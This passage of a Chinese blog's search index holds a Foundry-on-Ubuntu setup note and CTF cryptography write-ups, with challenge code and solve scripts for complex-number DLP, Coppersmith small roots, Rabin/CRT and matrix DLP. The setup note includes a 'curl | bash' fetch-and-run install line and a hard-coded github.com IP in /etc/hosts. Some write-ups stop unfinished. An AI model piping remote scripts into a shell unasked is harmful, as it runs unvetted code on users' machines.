<span class="number">448596413</span>*x^<span class="number">17</span> + <span class="number">2397497659</span>*x^<span class="number">16</span> + <span class="number">2353732701</span>*x^<span class="number">15</span> + <span class="number">2068949189</span>*x^<span class="number">14</span> + <span class="number">1826419168</span>*x^<span class="number">13</span> + <span class="number">1265366199</span>*x^<span class="number">12</span> + <span class="number">547031306</span>*x^<span class="number">11</span> + <span class="number">1016962374</span>*x^<span class="number">10</span> + <span class="number">160089486</span>*x^<span class="number">9</span> + <span class="number">2264803979</span>*x^<span class="number">8</span> + <span class="number">1081806194</span>*x^<span class="number">7</span> + <span class="number">824215340</span>*x^<span class="number">6</span> + <span class="number">497731793</span>*x^<span class="number">5</span> + <span class="number">45017166</span>*x^<span class="number">4</span> + <span class="number">317548920</span>*x^<span class="number">3</span> + <span class="number">1391127733</span>*x^<span class="number">2</span> + <span class="number">1752881284</span>*x + <span class="number">1290424106</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>NOTE</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu下Foundry配置</title>
    <url>/2025/08/08/Ubuntu%E4%B8%8BFoundry%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>owo</p>
<p>记录一下</p>
<span id="more"></span>

<p>准备继续学习区块链的一些知识了，先配置一下Foundry</p>
<h1 id="Rustup配置"><a href="#Rustup配置" class="headerlink" title="Rustup配置"></a>Rustup配置</h1><p>首先要给Linux里装一个Rust，因为Foundry是基于Rust的，直接按官网来搞就行<a href="https://rustup.rs/">rustup.rs - The Rust toolchain installer</a>，不过记得要换源不然巨慢无比</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">echo &#x27;export RUSTUP_UPDATE_ROOT=https://mirrors.tuna.tsinghua.edu.cn/rustup/rustup&#x27; &gt;&gt; ~/.bash_profile</span><br><span class="line">echo &#x27;export RUSTUP_DIST_SERVER=https://mirrors.tuna.tsinghua.edu.cn/rustup&#x27; &gt;&gt; ~/.bash_profile</span><br></pre></td></tr></table></figure>

<h1 id="Foundryup安装"><a href="#Foundryup安装" class="headerlink" title="Foundryup安装"></a>Foundryup安装</h1><p>然后使用以下命令安装Foundryup</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -L https://foundry.paradigm.xyz | bash</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>安装完成之后直接在控制台输入foundryup就可以了，会提醒你更换路径或者重新打开一个终端运行foundryup</p>
<h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><p>首先是网络的问题，安装Foundryup的时候突然发现右上角网络图标没了。</p>
<p>服务的名字变更为了NetworkManager，所以需要改一下</p>
<p>依次运行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo service NetworkManager stop</span><br><span class="line">sudo rm /var/lib/NetworkManager/NetworkManager.state</span><br><span class="line">sudo service NetworkManager start</span><br></pre></td></tr></table></figure>

<p>然后在控制台输入foundryup的时候显示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Failed connect to github.com:443; Connection refused</span><br></pre></td></tr></table></figure>

<p>最开始以为是网络的问题，结果改了一通还是连不上，然后ping 了一下github发现ping到127.0.0.1了，绷不住了。显然是本地DNS的问题了。</p>
<p>执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vi /etc/hosts</span><br></pre></td></tr></table></figure>

<p>在里面加上140.82.112.4 github.com 即可。</p>
<h1 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h1><p>最后 forge init即可。</p>
]]></content>
      <tags>
        <tag>NOTES</tag>
      </tags>
  </entry>
  <entry>
    <title>XYCTF-crypto</title>
    <url>/2024/04/28/XYCTF-crypto/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次打比赛，被新生赛狠狠拷打了QAQ</p>
<span id="more"></span>

<h1 id="Complex-dlp"><a href="#Complex-dlp" class="headerlink" title="Complex_dlp"></a>Complex_dlp</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, re, im</span>):</span><br><span class="line">        self.re = re</span><br><span class="line">        self.im = im</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, c</span>):</span><br><span class="line">        re_ = self.re * c.re - self.im * c.im</span><br><span class="line">        im_ = self.re * c.im + self.im * c.re</span><br><span class="line">        <span class="keyword">return</span> Complex(re_, im_)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.im == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(self.re)</span><br><span class="line">        <span class="keyword">elif</span> self.re == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(self.im) == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> <span class="keyword">if</span> self.im &lt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span>i&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.im&#125;</span>i&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.re&#125;</span> <span class="subst">&#123;<span class="string">&#x27;+&#x27;</span> <span class="keyword">if</span> self.im &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;-&#x27;</span>&#125;</span> <span class="subst">&#123;<span class="built_in">abs</span>(self.im)&#125;</span>i&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">complex_pow</span>(<span class="params">c, exp, n</span>):</span><br><span class="line">    result = Complex(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> exp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> exp &amp; <span class="number">1</span>:</span><br><span class="line">            result = result * c</span><br><span class="line">            result.re = result.re % n</span><br><span class="line">            result.im = result.im % n</span><br><span class="line">        c = c * c</span><br><span class="line">        c.re = c.re % n</span><br><span class="line">        c.im = c.im % n</span><br><span class="line">        exp &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = flag.strip(<span class="string">b&quot;XYCTF&#123;&quot;</span>).strip(<span class="string">b&quot;&#125;&quot;</span>)</span><br><span class="line">p = <span class="number">1127236854942215744482170859284245684922507818478439319428888584898927520579579027</span></span><br><span class="line">g = Complex(<span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line">x = bytes_to_long(flag)</span><br><span class="line"><span class="comment">#complex_pow(g, x, p)==5699996596230726507553778181714315375600519769517892864468100565238657988087817 + 198037503897625840198829901785272602849546728822078622977599179234202360717671908i</span></span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>做的时候一直卡在复数转实数上，想到了共轭复数但是没有去仔细研究。</p>
<p>赛后看wp知道了定义<img src="/pic/XYCTF-crypto/image-20240428191957162-1719079099042.png" alt="image-20240428191957162"></p>
<p>这样题目中的g和c都可以通过实部和虚部平方相加的方式转为实数再进行普通的dlp求解 </p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory <span class="keyword">import</span> discrete_log</span><br><span class="line">p=<span class="number">1127236854942215744482170859284245684922507818478439319428888584898927520579579027</span></span><br><span class="line">g=<span class="number">58</span></span><br><span class="line">c=(<span class="number">5699996596230726507553778181714315375600519769517892864468100565238657988087817</span>**<span class="number">2</span>)+(<span class="number">198037503897625840198829901785272602849546728822078622977599179234202360717671908</span>**<span class="number">2</span>)</span><br><span class="line">flag=discrete_log(p,c,g)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure>

<h1 id="Complex-rsa"><a href="#Complex-rsa" class="headerlink" title="Complex_rsa"></a>Complex_rsa</h1><p>与上题类似，也是一个复数域上的问题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, re, im</span>):</span><br><span class="line">        self.re = re</span><br><span class="line">        self.im = im</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, c</span>):</span><br><span class="line">        re_ = self.re * c.re - self.im * c.im</span><br><span class="line">        im_ = self.re * c.im + self.im * c.re</span><br><span class="line">        <span class="keyword">return</span> Complex(re_, im_)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.im == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(self.re)</span><br><span class="line">        <span class="keyword">elif</span> self.re == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(self.im) == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> <span class="keyword">if</span> self.im &lt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span>i&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.im&#125;</span>i&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.re&#125;</span> <span class="subst">&#123;<span class="string">&#x27;+&#x27;</span> <span class="keyword">if</span> self.im &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;-&#x27;</span>&#125;</span> <span class="subst">&#123;<span class="built_in">abs</span>(self.im)&#125;</span>i&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">complex_pow</span>(<span class="params">c, exp, n</span>):</span><br><span class="line">    result = Complex(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> exp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> exp &amp; <span class="number">1</span>:</span><br><span class="line">            result = result * c</span><br><span class="line">            result.re = result.re % n</span><br><span class="line">            result.im = result.im % n</span><br><span class="line">        c = c * c</span><br><span class="line">        c.re = c.re % n</span><br><span class="line">        c.im = c.im % n</span><br><span class="line">        exp &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">key = getRandomNBitInteger(m.bit_length())</span><br><span class="line">c = m ^ key</span><br><span class="line">com = Complex(key, c)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">e = <span class="number">9</span></span><br><span class="line">enc = complex_pow(com, e, p * q)</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br><span class="line"><span class="built_in">print</span>(Complex(p, q) * Complex(p, q))</span><br><span class="line"><span class="comment"># 66350931528185981323649477263900844564494528747802437244889229343520648562164950914433406604580038018765783183569276743239888668912948977370163046257917321742455772852779551569446155827368453262479370103326286297164105599131090881306108546341785251895116423206455175290083968296281375908109039893280371271943 + 65266730684129269806656018828265187384002656633231286337130178390517924611751697965395744944541329793503617856896706439809241745206839328124348693486741656130890593895436661857688522977866438805549144904296596887218275440542852887148071837153436265722614658566275517205322945316112048487893204059562830581004i</span></span><br><span class="line"><span class="comment"># -28814875173103880290298835537218644402443395484370652510062722255203946330565951328874411874019897676900075613671629765922970689802650462822117767927082712245512492082864958877932682404829188622269636302484189627580600076246836248427780151681898051243380477561480415972565859837597822263289141887833338111120 + 235362412848885579543400940934854106052672292040465052424316433330114813432317923674803623227280862945857543620663672974955235166884830751834386990766053503640556408758413592161122945636548462064584183165189050320898315823173824074873376450569212651128285746330837777597290934043912373820690250920839961482862i</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>已知Complex(p, q) * Complex(p, q)，明显通过该式子求得p，q，同时在复数域中phi&#x3D;（p^2^-1)（q^2^-1）,按照一般的思路求e关于phi的逆元即可得到结果，但对于这道题有</p>
<p>gcd(e，p^2^-1)&#x3D;gcd(e,q^2^-1)&#x3D;3,所以逆元不存在。</p>
<h1 id="反方向的密码-相思"><a href="#反方向的密码-相思" class="headerlink" title="反方向的密码 相思"></a>反方向的密码 相思</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(x.encode()).digest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">return</span> message + <span class="built_in">hash</span>(<span class="built_in">str</span>(<span class="built_in">len</span>(message)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(pad(flag))</span><br><span class="line">p = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">q = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(m, e, n))</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="comment"># c=120440199294949712392334113337541924034371176306546446428347114627162894108760435789068328282135879182130546564535108930827440004987170619301799710272329673259390065147556073101312748104743572369383346039000998822862286001416166288971531241789864076857299162050026949096919395896174243383291126202796610039053</span></span><br><span class="line"><span class="comment"># n=143413213355903851638663645270518081058249439863120739973910994223793329606595495141951165221740599158773181585002460087410975579141155680671886930801733174300593785562287068287654547100320094291092508723488470015821072834947151827362715749438612812148855627557719115676595686347541785037035334177162406305243</span></span><br><span class="line"><span class="comment"># m=1252734178929444996144243699830218307941015280272407466795285950142407741311749512416560379489724065530428888294520405996969464281930538422811270188075397985</span></span><br></pre></td></tr></table></figure>

<p><img src="/pic/XYCTF-crypto/202406230159863.png"></p>
<p>其实就是将sha256看做256进制，256^32^代表将m作为高位拼接到32字节的h之前，其实与二进制移位乘2^n^道理一样。最后copper求小根。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(x.encode()).digest()</span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">120440199294949712392334113337541924034371176306546446428347114627162894108760435789068328282135879182130546564535108930827440004987170619301799710272329673259390065147556073101312748104743572369383346039000998822862286001416166288971531241789864076857299162050026949096919395896174243383291126202796610039053</span></span><br><span class="line">n = <span class="number">143413213355903851638663645270518081058249439863120739973910994223793329606595495141951165221740599158773181585002460087410975579141155680671886930801733174300593785562287068287654547100320094291092508723488470015821072834947151827362715749438612812148855627557719115676595686347541785037035334177162406305243</span></span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"><span class="keyword">for</span> length <span class="keyword">in</span> trange(<span class="number">20</span>,<span class="number">50</span>):</span><br><span class="line">    suffix = bytes_to_long(<span class="built_in">hash</span>(<span class="built_in">str</span>(length)))</span><br><span class="line">    f = (<span class="number">256</span>^<span class="number">32</span>*x + suffix)^<span class="number">3</span> - c</span><br><span class="line">    f = f.monic()</span><br><span class="line">    res = f.small_roots(X=<span class="number">256</span>^length,beta=<span class="number">1</span>,epsilon=<span class="number">0.05</span>)</span><br><span class="line">    <span class="keyword">if</span>(res != []):</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(res[<span class="number">0</span>])))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>VNCTF2025复现</title>
    <url>/2025/02/24/VNCTF2025%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>owo</p>
<p>这次比赛做出了三道题，已经感觉燃尽了。不过跟之前比已经有很大进步了。继续加油！</p>
<span id="more"></span>

<h1 id="1，easymath"><a href="#1，easymath" class="headerlink" title="1，easymath"></a>1，easymath</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">flag=bytes_to_long(flag)</span><br><span class="line">l=flag.bit_length()//<span class="number">3</span> + <span class="number">1</span></span><br><span class="line">n=[]</span><br><span class="line">N=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(n) &lt; <span class="number">3</span>:</span><br><span class="line">    p = <span class="number">4</span>*getPrime(l)-<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> isPrime(p):</span><br><span class="line">        n.append(p)</span><br><span class="line">        N *= p</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;flag*flag%N&#125;</span>&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> symbols, expand</span><br><span class="line">x = symbols(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">polynomial = expand((x - n[<span class="number">0</span>]) * (x - n[<span class="number">1</span>]) * (x - n[<span class="number">2</span>]))</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;polynomial=&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># c=24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span></span><br><span class="line"><span class="comment"># polynomial=x**3 - 15264966144147258587171776703005926730518438603688487721465*x**2 + 76513250180666948190254989703768338299723386154619468700730085586057638716434556720233473454400881002065319569292923*x - 125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619</span></span><br></pre></td></tr></table></figure>

<p>展开一下方程计算式可以发现是x^3^+(a+b+c)x^2^+(ab+bc+ca)x+abc.列三个等式解方程就行了。求出abc之后crt一下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> is_prime</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> symbols, expand, sqrt_mod</span><br><span class="line"><span class="keyword">from</span> sympy.abc <span class="keyword">import</span> x</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> prod</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">S = <span class="number">15264966144147258587171776703005926730518438603688487721465</span>  <span class="comment"># 二次项系数的相反数</span></span><br><span class="line">P = <span class="number">76513250180666948190254989703768338299723386154619468700730085586057638716434556720233473454400881002065319569292923</span>  <span class="comment"># 一次项系数</span></span><br><span class="line">N = <span class="number">125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619</span> <span class="comment"># 常数项的绝对值（因为多项式中的常数项是 -N）</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span>  <span class="comment"># 替换为实际输出的c值</span></span><br><span class="line"></span><br><span class="line">p1, p2, p3 =<span class="number">3868765709106144154703556118635822400623994075212553582411</span> ,<span class="number">5487564316951417093934647798659941512646442958127439071827</span> ,<span class="number">5908636118089697338533572785710162817248001570348495067227</span>   <span class="comment"># 示例素数，需替换</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证是否满足生成条件</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>((pi + <span class="number">1</span>) % <span class="number">4</span> == <span class="number">0</span> <span class="keyword">for</span> pi <span class="keyword">in</span> [p1, p2, p3])</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(is_prime((pi + <span class="number">1</span>) // <span class="number">4</span>) <span class="keyword">for</span> pi <span class="keyword">in</span> [p1, p2, p3])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证多项式系数</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">sum</span>([p1, p2, p3]) == S</span><br><span class="line"><span class="keyword">assert</span> p1*p2 + p1*p3 + p2*p3 == P</span><br><span class="line"><span class="keyword">assert</span> p1 * p2 * p3 == N</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解每个素数的平方根</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_roots</span>(<span class="params">c, primes</span>):</span><br><span class="line">    solutions = []</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> primes:</span><br><span class="line">        cp = c % p</span><br><span class="line">        <span class="keyword">if</span> cp == <span class="number">0</span>:</span><br><span class="line">            roots = [<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            roots = sqrt_mod(cp, p, all_roots=<span class="literal">True</span>)</span><br><span class="line">        solutions.append(roots)</span><br><span class="line">    <span class="keyword">return</span> solutions</span><br><span class="line"></span><br><span class="line">primes = [p1, p2, p3]</span><br><span class="line">solution_list = solve_roots(c, primes)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成所有可能的解组合</span></span><br><span class="line">combinations = product(*solution_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用中国剩余定理求解</span></span><br><span class="line">valid_flags = []</span><br><span class="line"><span class="keyword">for</span> combo <span class="keyword">in</span> combinations:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 使用sympy的crt方法</span></span><br><span class="line">        <span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line">        moduli = primes</span><br><span class="line">        remainders = combo</span><br><span class="line">        x, _ = crt(moduli, remainders)</span><br><span class="line">        <span class="keyword">if</span> (x*x) % N == c % N:</span><br><span class="line">            valid_flags.append(x)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查所有可能解</span></span><br><span class="line"><span class="keyword">for</span> flag <span class="keyword">in</span> valid_flags:</span><br><span class="line">    flag_bytes = long_to_bytes(flag)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;VN&#x27;</span> <span class="keyword">in</span> flag_bytes:</span><br><span class="line">        <span class="built_in">print</span>(flag_bytes.decode())</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># 检查N - x的情况，因为平方根可能在对称位置</span></span><br><span class="line">    <span class="keyword">for</span> flag <span class="keyword">in</span> valid_flags:</span><br><span class="line">        flag = N - flag</span><br><span class="line">        flag_bytes = long_to_bytes(flag)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;VN&#x27;</span> <span class="keyword">in</span> flag_bytes:</span><br><span class="line">            <span class="built_in">print</span>(flag_bytes.decode())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="2，ss0Hurt"><a href="#2，ss0Hurt" class="headerlink" title="2，ss0Hurt!"></a>2，ss0Hurt!</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DaMie</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, flag , n = <span class="literal">None</span></span>):</span><br><span class="line">        self.m = ZZ(bytes_to_long(flag))</span><br><span class="line">        self.n = n <span class="keyword">if</span> n <span class="keyword">else</span> getPrime(<span class="number">1024</span>)</span><br><span class="line">        self.P = Zmod(self.n)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;self.n&#125;</span>&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process</span>(<span class="params">self, x, y, z</span>):</span><br><span class="line">        b = vector([<span class="number">5</span> * x + y - <span class="number">5</span> * z, <span class="number">5</span> * y - z, <span class="number">5</span> * z])</span><br><span class="line">        <span class="built_in">print</span>(x,y,z,b)</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Mat</span>(<span class="params">self, m</span>):</span><br><span class="line">        PR = self.P[<span class="string">&#x27;x,y,z&#x27;</span>]</span><br><span class="line">        x,y,z = PR.gens()</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> m != <span class="number">0</span>:</span><br><span class="line">            plana = self.Mat(m//<span class="number">2</span>)</span><br><span class="line">            planb = plana(*plana)</span><br><span class="line">            <span class="keyword">if</span> m % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> planb</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> self.process(*planb)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.process(*PR.gens())</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">self, A, B, C</span>):</span><br><span class="line">        <span class="keyword">return</span> self.Mat(self.m)(A, B, C)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    </span><br><span class="line">    Ouch = DaMie(flag)</span><br><span class="line">    result = Ouch.<span class="built_in">hash</span>(<span class="number">2025</span>,<span class="number">208</span>,<span class="number">209</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;hash(A,B,C) = <span class="subst">&#123;result&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>一个看着蛮复杂的题。分析一下可以发现其实是一个矩阵快速幂。也就是给定了𝑣&#x3D;𝐴^𝑚^mod n求m.也就是一个矩阵的dlp。一看到这个就想起了去年的XY第一次被矩阵支配的恐惧。参考鸡块师傅的blog（<a href="https://tangcuxiaojikuai.xyz/post/146254b2.html#more">2024-XYCTF-wp-crypto | 糖醋小鸡块的blog）</a>其实可以直接用板子，不过我们还是研究研究。要求矩阵幂的第一件事就是对角化，很容易发现A不可对角化，那就算其jordan form， 也就是求出𝐴&#x3D;𝑃𝐽𝑃−1，其中J是一个上三角矩阵 。其中，𝐴𝑚&#x3D;(𝑃𝐽𝑃−1)𝑚&#x3D;𝑃𝐽𝑚𝑃−1，所以可以表示为𝑣′&#x3D;𝐽𝑚𝑢′ 。看官方wp的时候学习到<img src="/../../AppData/Roaming/Typora/typora-user-images/image-20250224211712275.png" alt="image-20250224211712275"></p>
<p>后面就能求出n了。</p>
